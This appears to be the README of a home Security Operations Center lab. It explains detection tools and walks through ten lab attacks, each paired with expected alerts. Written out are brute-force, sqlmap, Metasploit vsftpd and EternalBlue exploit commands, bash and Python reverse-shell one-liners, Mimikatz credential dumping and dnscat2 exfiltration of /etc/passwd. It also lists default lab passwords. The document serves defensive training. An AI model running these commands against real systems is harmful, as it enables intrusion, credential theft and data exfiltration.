# 🛡️ CyberBlue — Personal SOC Home Lab

> A fully containerized Security Operations Center (SOC) lab built on Ubuntu using Docker.  
> Designed for learning threat detection, incident response, adversary emulation, and digital forensics.

---

## ⚠️ Important Notes

> **This lab is strictly for educational purposes in an isolated environment.**

- ❌ Do NOT deploy or test attacks on real networks or systems you do not own
- ✅ Run this lab on an isolated, air-gapped or NAT-only network
- ✅ All attack simulations must target lab VMs only (e.g., Metasploitable, DVWA)
- ✅ Ensure your host machine is NOT reachable from the internet while running attack simulations
- This project is intended for cybersecurity students, analysts, and researchers building defensive skills

---

## 📋 Table of Contents

1. [Lab Overview](#lab-overview)
2. [Tools & Their Roles](#tools--their-roles)
3. [Lab Architecture](#lab-architecture)
4. [Tool Integration & Data Flow](#tool-integration--data-flow)
5. [Attack Simulation Lab](#attack-simulation-lab)
6. [Quick Access](#quick-access)

---

## Lab Overview

CyberBlue is a personal SOC lab that simulates a real-world security operations environment. It brings together best-in-class open-source tools for:

- **SIEM & XDR** — collecting and correlating security events
- **Network traffic analysis** — capturing and inspecting packets
- **Intrusion detection** — alerting on suspicious network patterns
- **Digital forensics** — investigating endpoint activity
- **Incident response** — managing and triaging security cases
- **Threat intelligence** — enriching alerts with external context
- **Adversary emulation** — simulating real attacker behavior using MITRE ATT&CK

All tools run as Docker containers and are accessible via a unified portal.

---

## Tools & Their Roles

### 🔵 Wazuh — SIEM & XDR

**What it does:**  
Wazuh is an open-source Security Information and Event Management (SIEM) and Extended Detection and Response (XDR) platform. It collects logs from agents installed on endpoints, correlates events using built-in rules, and generates security alerts.

**Why it's used in a SOC:**  
Wazuh acts as the central nervous system of the SOC. It ingests logs from all monitored systems, detects anomalies, enforces compliance checks (PCI-DSS, GDPR, CIS), and provides file integrity monitoring (FIM).

**Attacks it detects:**
- Brute force and credential stuffing
- Privilege escalation attempts
- Rootkit and malware installation
- Unauthorized file modifications
- Web application attacks (SQLi, XSS via log analysis)
- Lateral movement and suspicious process execution

---

### 🦅 Velociraptor — DFIR & Endpoint Visibility

**What it does:**  
Velociraptor is a Digital Forensics and Incident Response (DFIR) platform. It deploys lightweight agents on endpoints and allows analysts to run forensic queries (VQL — Velociraptor Query Language) to hunt for threats in real time.

**Why it's used in a SOC:**  
When an alert fires, analysts need to investigate the endpoint immediately. Velociraptor allows live forensic collection — running processes, open connections, file hashes, registry keys, browser history, and more — without needing physical access.

**Attacks it detects:**
- Persistence mechanisms (scheduled tasks, startup entries, registry run keys)
- Process injection and hollow processes
- Credential dumping (LSASS access)
- Suspicious PowerShell / Bash execution
- Lateral movement artifacts
- Data exfiltration staging

---

### 🐟 Arkime — Network Traffic Analysis (Full Packet Capture)

**What it does:**  
Arkime (formerly Moloch) is a large-scale, full packet capture and indexing system. It captures all network traffic on the monitored interface, stores raw PCAP files, and provides a searchable web interface for session analysis.

**Why it's used in a SOC:**  
Network traffic doesn't lie. Arkime provides the ground truth — you can reconstruct entire sessions, extract transferred files, and trace every connection. It's essential for post-incident investigation and hunting.

**Attacks it detects:**
- Port scanning and enumeration
- C2 beaconing patterns
- DNS tunneling and exfiltration
- Suspicious file transfers (malware, tools dropped)
- Unencrypted credential transmission
- Lateral movement over SMB/RDP/SSH

---

### 📦 EveBox — IDS Alert Visualization (Suricata)

**What it does:**  
EveBox is a web-based interface for Suricata IDS/IPS events. It reads Suricata's `eve.json` log file and presents alerts, flows, DNS, HTTP, and file metadata in a searchable dashboard.

**Why it's used in a SOC:**  
Suricata generates thousands of raw events. EveBox makes them human-readable, allowing analysts to quickly triage IDS alerts, review network flows, and pivot to related events.

**Attacks it detects (via Suricata rules):**
- Exploit attempts (EternalBlue, Log4Shell, etc.)
- Malware signatures in network traffic
- Known C2 framework communications (Cobalt Strike, Metasploit)
- Protocol anomalies
- Port scans and vulnerability scanning tools (Nmap, Nessus)
- SQL injection and web attack patterns

---

### 🐝 TheHive — Incident Response Platform

**What it does:**  
TheHive is an open-source Security Incident Response Platform (SIRP). It allows SOC teams to create, manage, and collaborate on security cases and investigations. Each alert becomes a case with tasks, observables (IPs, hashes, domains), and timeline.

**Why it's used in a SOC:**  
Alerts without workflow are useless. TheHive provides the structure — when Wazuh fires an alert, it becomes a TheHive case. Analysts track investigation steps, assign tasks, document findings, and escalate appropriately. It integrates with Cortex for automated enrichment.

**Use cases in this lab:**
- Centralized alert case management
- Observable tracking (malicious IPs, file hashes, domains)
- Investigation timeline documentation
- Integration with Cortex analyzers for automated threat intel

---

### 🧠 Cortex — Threat Intelligence & Analyzers

**What it does:**  
Cortex is a threat intelligence engine that runs "analyzers" and "responders" on observables. Given an IP address, domain, file hash, or URL, Cortex queries dozens of threat intel sources (VirusTotal, Shodan, AbuseIPDB, etc.) and returns enriched reports.

**Why it's used in a SOC:**  
Manually querying 10 threat intel platforms per indicator is not scalable. Cortex automates this — when an analyst adds an observable to TheHive, Cortex automatically enriches it with reputation data, geolocation, malware reports, and more.

**Analyzers available:**
- VirusTotal — file/URL/IP reputation
- AbuseIPDB — IP abuse scoring
- Shodan — internet-exposed services
- URLhaus — malicious URL database
- MaxMind — geolocation
- And 100+ more

---

### ⚔️ Caldera — Adversary Emulation

**What it does:**  
Caldera is MITRE's adversary emulation platform. It deploys agents on target machines and executes real attack techniques mapped to the MITRE ATT&CK framework — simulating what a real attacker would do, step by step.

**Why it's used in a SOC:**  
You can't defend what you haven't tested. Caldera allows SOC teams to run controlled attack simulations and verify whether their detection tools (Wazuh, Suricata, Velociraptor) actually catch the attacks. It's used for purple teaming exercises.

**Attack techniques it emulates:**
- Reconnaissance and discovery
- Credential access (LSASS dump, keylogging)
- Lateral movement (pass-the-hash, WMI)
- Persistence (cron jobs, registry keys)
- Exfiltration over HTTP/DNS
- Defense evasion (process injection, obfuscation)

---

## Lab Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                          ISOLATED NETWORK                           │
│                                                                     │
│  ┌─────────────┐          ┌──────────────────────────────────────┐  │
│  │             │          │         SOC SERVER (Ubuntu)          │  │
│  │  ATTACKER   │◄────────►│                                      │  │
│  │ Kali Linux  │  Attack  │  ┌──────────┐  ┌─────────────────┐  │  │
│  │             │ Traffic  │  │  Wazuh   │  │  Velociraptor   │  │  │
│  └─────────────┘          │  │  SIEM    │  │  DFIR Agent     │  │  │
│                           │  └──────────┘  └─────────────────┘  │  │
│  ┌─────────────┐          │  ┌──────────┐  ┌─────────────────┐  │  │
│  │             │◄────────►│  │  Arkime  │  │    EveBox +     │  │  │
│  │   TARGET    │  Victim  │  │  PktCap  │  │   Suricata IDS  │  │  │
│  │ Metasploit- │ Traffic  │  └──────────┘  └─────────────────┘  │  │
│  │  able / VM  │          │  ┌──────────┐  ┌─────────────────┐  │  │
│  └─────────────┘          │  │ TheHive  │◄►│    Cortex       │  │  │
│                           │  │  IR/Case │  │  Threat Intel   │  │  │
│                           │  └──────────┘  └─────────────────┘  │  │
│                           │  ┌──────────┐                        │  │
│                           │  │ Caldera  │  (Purple Team)         │  │
│                           │  │ Emulator │                        │  │
│                           │  └──────────┘                        │  │
│                           └──────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘

  Roles:
  • Attacker Machine  : Kali Linux — runs offensive tools and simulated attacks
  • SOC Server        : Ubuntu + Docker — runs all detection and response tools
  • Target Machine    : Vulnerable VM (Metasploitable 2/3, Windows, DVWA)
```

---

## Tool Integration & Data Flow

```
Attack occurs on Target
        │
        ▼
┌───────────────┐     Network traffic      ┌──────────────────┐
│  Suricata IDS │ ─────────────────────►   │  EveBox          │
│  (on host)    │                          │  (Alert Review)  │
└───────────────┘                          └──────────────────┘
        │
        │ eve.json alerts
        ▼
┌───────────────┐     Full PCAP            ┌──────────────────┐
│  Arkime       │ ◄────────────────────────│  Network Mirror  │
│  (Packet Cap) │                          └──────────────────┘
└───────────────┘
        │
        │ Endpoint logs/events
        ▼
┌───────────────┐     Alert fired          ┌──────────────────┐
│  Wazuh SIEM   │ ────────────────────►    │  TheHive         │
│  (Log Correl.)│                          │  (Case Created)  │
└───────────────┘                          └────────┬─────────┘
        │                                           │
        │ Live forensics                            │ Observables sent
        ▼                                           ▼
┌───────────────┐                          ┌──────────────────┐
│ Velociraptor  │                          │  Cortex          │
│ (Endpoint     │                          │  (Auto-enriched  │
│  Forensics)   │                          │   with Threat    │
└───────────────┘                          │   Intelligence)  │
                                           └──────────────────┘

Purple Team Flow:
┌──────────┐  Execute ATT&CK techniques   ┌──────────────────┐
│ Caldera  │ ────────────────────────►    │  Target Agent    │
│(Emulator)│                              └──────────────────┘
└──────────┘                                       │
                                                   │ Generates real telemetry
                                                   ▼
                                          All tools above detect it
```

### Key Integration: Wazuh → TheHive → Cortex

1. **Wazuh** detects a brute force attack and fires an alert
2. A **webhook** or integration script sends the alert to **TheHive** as a new Case
3. The analyst adds the attacker's IP as an **Observable** in TheHive
4. **Cortex** automatically runs analyzers: AbuseIPDB, VirusTotal, Shodan
5. Analyst has full enrichment within seconds — no manual queries needed
6. **Velociraptor** is used to investigate the targeted endpoint live
7. **Arkime** provides full packet capture of the attack session for evidence

---

## Attack Simulation Lab

> ⚠️ **Execute these ONLY on your isolated lab. Never on production or unauthorized systems.**

All attacks are launched from **Kali Linux** against a **target VM** (e.g., Metasploitable 2 at `192.168.1.100`) while the **SOC stack monitors** from `192.168.1.14`.

---

### 🟢 Basic Attacks (Beginner)

---

#### Attack 1 — SSH Brute Force

| Field | Detail |
|-------|--------|
| **Objective** | Gain access by guessing SSH credentials |
| **MITRE ATT&CK** | T1110.001 — Brute Force: Password Guessing |

**Commands (Kali):**
```bash
# Using Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4 -V

# Or using Medusa
medusa -h 192.168.1.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
```

**Expected Detection:**
- **Wazuh**: Multiple failed SSH login rule (rule 5710/5712) → alert level 10+, brute force decoder triggers
- **Arkime**: High volume of TCP connections to port 22 from same source IP
- **EveBox**: Suricata SSH brute force signature (ET SCAN) fires multiple times
- **Velociraptor**: `/var/log/auth.log` shows repeated failed auth attempts; `last` command shows unusual login

---

#### Attack 2 — Nmap Port Scan

| Field | Detail |
|-------|--------|
| **Objective** | Discover open ports and services on target |
| **MITRE ATT&CK** | T1046 — Network Service Discovery |

**Commands (Kali):**
```bash
# Full TCP scan
nmap -sS -sV -O -p- 192.168.1.100

# Aggressive scan with scripts
nmap -A -T4 192.168.1.100

# UDP scan (slower)
nmap -sU --top-ports 100 192.168.1.100
```

**Expected Detection:**
- **Wazuh**: Host-based log showing connection spike; portscan decoder may trigger
- **Arkime**: Burst of SYN packets to hundreds of ports visible in session view
- **EveBox**: Suricata ET SCAN rules fire (Nmap fingerprint, SYN scan pattern)
- **Velociraptor**: Network connection table shows burst of half-open connections from Kali IP

---

#### Attack 3 — FTP Anonymous Login + File Enumeration

| Field | Detail |
|-------|--------|
| **Objective** | Access FTP server anonymously and enumerate files |
| **MITRE ATT&CK** | T1078 — Valid Accounts / T1083 — File and Directory Discovery |

**Commands (Kali):**
```bash
# Try anonymous login
ftp 192.168.1.100
# username: anonymous
# password: anything

# Or using Nmap
nmap -p 21 --script ftp-anon,ftp-syst,ftp-ls 192.168.1.100

# List files
ls -la
get sensitive_file.txt
```

**Expected Detection:**
- **Wazuh**: Anonymous FTP login rule triggers (rule 11101)
- **Arkime**: FTP session visible; file transfer captured in plaintext
- **EveBox**: Suricata FTP anonymous login signature
- **Velociraptor**: Process tree shows FTP daemon activity; file access log updated

---

### 🟡 Intermediate Attacks

---

#### Attack 4 — Metasploit Exploitation (vsftpd Backdoor)

| Field | Detail |
|-------|--------|
| **Objective** | Exploit a known backdoor in vsftpd 2.3.4 to get a shell |
| **MITRE ATT&CK** | T1190 — Exploit Public-Facing Application |

**Commands (Kali):**
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
set RPORT 21
run
# If successful, you get a root shell
whoami
id
```

**Expected Detection:**
- **Wazuh**: Suspicious process spawn from FTP daemon; shell execution rule fires
- **Arkime**: Malformed FTP request followed by unexpected outbound connection on port 6200
- **EveBox**: Suricata EXPLOIT vsftpd backdoor signature (ET EXPLOIT category)
- **Velociraptor**: New process spawned by vsftpd with shell — visible in process tree hunt

---

#### Attack 5 — HTTP Directory Brute Force (DVWA / Web App)

| Field | Detail |
|-------|--------|
| **Objective** | Discover hidden directories and admin panels on a web server |
| **MITRE ATT&CK** | T1595.003 — Wordlist Scanning |

**Commands (Kali):**
```bash
# Using Gobuster
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Using Dirb
dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt

# Using Feroxbuster (faster)
feroxbuster --url http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
```

**Expected Detection:**
- **Wazuh**: Web server log shows massive 404 spike from single IP; web attack rule triggers
- **Arkime**: High-frequency HTTP GET requests to random paths; all from same User-Agent
- **EveBox**: ET SCAN Web Application Scan signatures, HTTP flood pattern
- **Velociraptor**: Apache/Nginx access log artifact shows 404 flood; web process CPU spike

---

#### Attack 6 — SQL Injection (SQLmap)

| Field | Detail |
|-------|--------|
| **Objective** | Extract database contents via SQL injection vulnerability |
| **MITRE ATT&CK** | T1190 — Exploit Public-Facing Application / T1005 — Data from Local System |

**Commands (Kali):**
```bash
# Basic detection
sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
  --dbs

# Extract tables from target DB
sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
  -D dvwa --tables

# Dump users table
sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
  -D dvwa -T users --dump
```

**Expected Detection:**
- **Wazuh**: Web application attack rule fires (rule 31103/31106 — SQL injection pattern in URL)
- **Arkime**: HTTP requests with SQL keywords (`UNION`, `SELECT`, `--`) visible in session data
- **EveBox**: Suricata ET WEB_SERVER SQL Injection attempt signatures
- **Velociraptor**: Web server error logs show DB query errors; anomalous DB process activity

---

#### Attack 7 — Reverse Shell via Netcat

| Field | Detail |
|-------|--------|
| **Objective** | Establish a reverse shell from target back to attacker |
| **MITRE ATT&CK** | T1059 — Command and Scripting Interpreter / T1071 — Application Layer Protocol |

**Commands (Kali):**
```bash
# On Kali (attacker) — listen for incoming connection
nc -lvnp 4444

# On target (once you have command execution via another exploit):
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1

# Or via Python
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.50",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

**Expected Detection:**
- **Wazuh**: Suspicious outbound connection rule; bash spawning child with I/O redirect
- **Arkime**: Unusual persistent TCP session from target to Kali on non-standard port
- **EveBox**: Suricata SHELLCODE and reverse shell signatures; ET MALWARE generic shell
- **Velociraptor**: Process with open socket on port 4444; stdin/stdout redirected — flagged in connection hunt

---

### 🔴 Advanced / Dangerous Attacks (Isolated Lab Only)

---

#### Attack 8 — EternalBlue (MS17-010) — SMB Exploit

| Field | Detail |
|-------|--------|
| **Objective** | Exploit unpatched Windows SMB vulnerability for SYSTEM-level access |
| **MITRE ATT&CK** | T1210 — Exploitation of Remote Services |

> ⚠️ Target must be an unpatched Windows VM (e.g., Windows 7 without MS17-010 patch)

**Commands (Kali):**
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.101   # Windows target IP
set LHOST 192.168.1.50     # Kali IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Post exploitation
meterpreter> sysinfo
meterpreter> hashdump
meterpreter> getsystem
```

**Expected Detection:**
- **Wazuh**: SMB exploit rule fires; Windows Event Log 4625/4648 + suspicious LSASS access
- **Arkime**: Malformed SMBv1 packets with EternalBlue shellcode pattern visible in PCAP
- **EveBox**: Suricata ET EXPLOIT EternalBlue SMB RCE — high severity alert fires immediately
- **Velociraptor**: LSASS memory access, new SYSTEM-level process, meterpreter DLL injection visible

---

#### Attack 9 — Credential Dumping (Mimikatz via Meterpreter)

| Field | Detail |
|-------|--------|
| **Objective** | Extract plaintext credentials and NTLM hashes from memory |
| **MITRE ATT&CK** | T1003.001 — OS Credential Dumping: LSASS Memory |

> ⚠️ Requires prior foothold on Windows target

**Commands (Kali):**
```bash
# Inside a Meterpreter session (post EternalBlue or similar)
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets

# Or upload mimikatz directly
meterpreter> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Windows\\Temp\\
meterpreter> shell
C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Expected Detection:**
- **Wazuh**: Windows Event 4656/4663 — LSASS handle opened; Sysmon Event 10 (process access to lsass.exe)
- **Arkime**: Possible exfiltration session if credentials sent over network
- **EveBox**: Suricata ET MALWARE Mimikatz User-Agent or known Mimikatz network patterns
- **Velociraptor**: Hunt for LSASS access — `Generic.Detection.Yara.Process` or `Windows.Detection.Mimikatz` artifact fires immediately

---

#### Attack 10 — Data Exfiltration via DNS Tunneling

| Field | Detail |
|-------|--------|
| **Objective** | Exfiltrate data from target by encoding it inside DNS queries — bypasses most firewalls |
| **MITRE ATT&CK** | T1048.003 — Exfiltration Over Alternative Protocol: DNS |

**Commands (Kali):**
```bash
# Install dnscat2 on Kali (server side)
gem install dnscat2
ruby dnscat2.rb --dns "domain=lab.local,host=192.168.1.50" --no-cache --security=open

# On target machine (client) — send data over DNS
./dnscat --dns server=192.168.1.50,port=53 --secret=s3cr3t

# Inside dnscat session — exfiltrate a file
dnscat2> window -i 1
command (target)> download /etc/passwd /tmp/out.txt
```

**Expected Detection:**
- **Wazuh**: High-frequency DNS queries to unusual domain; DNS anomaly rule triggers
- **Arkime**: Hundreds of DNS queries with abnormally long subdomains and base64-like encoding visible
- **EveBox**: Suricata ET DNS tunnel signatures; unusually long DNS query names alert
- **Velociraptor**: `Windows.Network.DNS` or Linux equivalent artifact shows abnormal DNS query frequency and sizes

---

## Quick Access

| Tool | URL | Default Credentials |
|------|-----|---------------------|
| 🌐 Portal | https://192.168.1.14:5443 | admin / cyberblue123 |
| 🦅 Velociraptor | https://192.168.1.14:7000 | admin / cyberblue |
| 🔵 Wazuh | https://192.168.1.14:7001 | admin / SecretPassword |
| 🧩 MISP | https://192.168.1.14:7003 | admin@admin.test / admin |
| 🐝 TheHive | http://192.168.1.14:7005 | admin@thehive.local / secret |
| 🧠 Cortex | http://192.168.1.14:7006 | *(set on first login)* |
| 🐟 Arkime | http://192.168.1.14:7008 | admin / admin |
| ⚔️ Caldera | http://192.168.1.14:7009 | admin / cyberblue |
| 📦 EveBox | https://192.168.1.14:7015 | *(no auth)* |
| 🐳 Portainer | https://192.168.1.14:9443 | *(set on first login)* |

---

## Prerequisites

```bash
# Minimum specs recommended
CPU   : 8 cores
RAM   : 16 GB
Disk  : 100 GB SSD
OS    : Ubuntu 22.04 LTS
Docker: 24.x + Docker Compose v2
```

---

## Starting the Lab

```bash
cd ~/Desktop/cyberblue/MiniCblue

# Start all services
sudo docker compose up -d

# After reboot — Wazuh dashboard needs manual start
sudo docker start wazuh-dashboard

# Check all containers
sudo docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"

# Port health check
for port in 5443 7000 7001 7003 7005 7006 7008 7009 7015 9443; do
  nc -z localhost $port 2>/dev/null && echo "✅ $port open" || echo "❌ $port closed"
done
```

---

*Built with 💙 for learning — CyberBlue SOC Lab*
